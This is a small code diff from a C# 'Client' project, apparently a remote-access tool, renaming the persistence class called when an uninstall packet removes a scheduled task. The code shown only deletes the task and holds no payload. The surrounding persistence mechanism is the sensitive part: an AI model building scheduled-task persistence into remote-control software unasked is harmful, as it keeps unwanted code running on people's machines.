@@ -37,7 +37,7 @@ namespace Client
                         break;
 
                     case (PacketType.UNINSTALL_CLOSE_CLIENT):
-                        Persistence.Launch.RemoveTaskScheduler(Config.taskName);
+                        Persistence.TaskScheduler.RemoveTaskScheduler(Config.taskName);
                         break;
 
                     default:
